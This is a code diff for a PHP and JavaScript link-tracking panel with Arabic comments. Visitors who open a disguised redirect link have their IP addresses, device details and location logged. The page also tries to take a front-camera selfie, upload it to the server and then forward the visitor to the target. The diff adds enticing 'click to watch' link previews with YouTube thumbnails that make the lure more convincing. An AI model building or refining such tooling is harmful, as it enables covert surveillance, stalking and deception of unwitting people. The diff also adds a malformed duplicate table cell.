@@ -6,7 +6,7 @@ error_reporting(E_ALL);
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول مع إضافة حقل لصورة السيلفي
+    // إنشاء الجداول
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -41,12 +41,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['a
     $imgData =$_POST['image'] ?? '';
     
     if (!empty($imgData) && !empty($code)) {
-        // تنظيف بيانات الصورة وإزالة الرأسية
         $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
         $imgData = str_replace(' ', '+',$imgData);
         $decodedData = base64_decode($imgData);
         
-        // إنشاء مجلد للصور إذا لم يكن موجوداً
         if (!file_exists('uploads')) {
             mkdir('uploads', 0755, true);
         }
@@ -54,7 +52,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['a
         $filename = 'uploads/photo_' .$code . '_' . time() . '.jpg';
         file_put_contents($filename,$decodedData);
         
-        // حفظ مسار الصورة في آخر سجل يخص هذا الكود
         $stmt =$db->prepare("UPDATE logs SET photo = ? WHERE code = ? ORDER BY id DESC LIMIT 1");
         $stmt->execute([$filename,$code]);
         
@@ -106,14 +103,20 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 
+            'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
     return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
 }
 
-// 1. معالجة إعادة التوجيه
+// متغيرات المعاينة الافتراضية
+$og_title = "Hello World from azez";
+$og_description = "لوحة تحكم تتبع الروابط المتقدمة";
+$og_image = "";
+
+// 1. معالجة إعادة التوجيه وجلب بيانات الرابط للمعاينة
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
@@ -123,7 +126,18 @@ if (isset($_GET['r'])) {
     if ($link) {
         $target =$link['target_url'];
         
-        // إذا كان الطلب قادماً لالتقاط الصورة عبر الجافاسكريبت
+        // تخصيص عنوان معاينة افتراضي بناء على الرابط المستهدف
+        $og_title = "انقر للمشاهدة: " . $target;
+        $og_description = "اضغط هنا لفتح المحتوى المطلوب";
+
+        // إذا كان الرابط يوتيوب، نحاول جلب صورة مصغرة للفيديو لتظهر في المعاينة
+        if (strpos($target, 'youtube.com') !== false || strpos($target, 'youtu.be') !== false) {
+            preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $target,$match);
+            if (!empty($match[1])) {
+                $og_image = "https://img.youtube.com/vi/" . $match[1] . "/hqdefault.jpg";
+            }
+        }
+
         if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
             exit();
         }
@@ -144,7 +158,6 @@ if (isset($_GET['r'])) {
             // الاستمرار في حالة خطأ السجل
         }
 
-        // إذا تم إرسال معلومات الشاشة، نقوم بتحويل الزائر للرابط المستهدف
         if (isset($_GET['screen'])) {
             header("Location: " . $target);
             exit();
@@ -188,7 +201,16 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hello World from azez</title>
+    <title><?php echo htmlspecialchars($og_title); ?></title>
+    
+    <!-- وسوم المعاينة لبرامج التراسل (Open Graph) -->
+    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
+    <meta property="og:description" content="<?php echo htmlspecialchars($og_description); ?>">
+    <?php if (!empty($og_image)): ?>
+        <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
+    <?php endif; ?>
+    <meta property="og:type" content="website">
+
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
@@ -231,9 +253,7 @@ if (!empty($filter_code)) {
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
-            // إذا فتح الزائر الرابط لأول مرة
             if (redirectCode && !hasScreen) {
-                // محاولة التقاط صورة سيلفي أولاً
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                         .then(function(stream) {
@@ -249,10 +269,8 @@ if (!empty($filter_code)) {
                                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 const imageData = canvas.toDataURL('image/jpeg', 0.8);
                                 
-                                // إيقاف الكاميرا
                                 stream.getTracks().forEach(track => track.stop());
 
-                                // إرسال الصورة للخادم
                                 const formData = new URLSearchParams();
                                 formData.append('action', 'save_photo');
                                 formData.append('code', redirectCode);
@@ -264,10 +282,9 @@ if (!empty($filter_code)) {
                                 }).finally(() => {
                                     proceedRedirect(redirectCode);
                                 });
-                            }, 1000); // الانتظار لثانية لضمان تشغيل الكاميرا
+                            }, 1000);
                         })
                         .catch(function(error) {
-                            // في حال رفض الإذن أو عدم وجود كاميرا، المتابعة طبيعياً
                             proceedRedirect(redirectCode);
                         });
                 } else {
@@ -389,7 +406,8 @@ if (!empty($filter_code)) {
                                 </td>
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></td>
+                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
+                                <td style="color: #fbbf24; font-weight: bold;"><?="htmlspecialchars($log['device_info'])";?></td>
                                 <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
